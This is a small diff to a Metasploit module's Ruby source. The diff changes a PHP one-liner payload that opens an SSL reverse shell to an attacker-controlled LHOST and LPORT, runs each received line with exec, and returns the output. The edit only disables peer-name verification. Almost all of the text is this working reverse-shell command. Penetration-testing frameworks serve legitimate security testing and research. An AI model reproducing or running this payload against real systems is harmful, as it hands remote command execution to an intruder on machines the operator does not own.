@@ -49,6 +49,6 @@ module MetasploitModule
     lhost = datastore['LHOST']
     ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    cmd = "php -r '$ctxt=stream_context_create([\"ssl\"=>[\"verify_peer\"=>false]]);while($s=@stream_socket_client(\"ssl://#{datastore['LHOST']}:#{datastore['LPORT']}\",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
+    cmd = "php -r '$ctxt=stream_context_create([\"ssl\"=>[\"verify_peer\"=>false,\"verify_peer_name\"=>false]]);while($s=@stream_socket_client(\"ssl://#{datastore['LHOST']}:#{datastore['LPORT']}\",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}}'&"
   end
 end
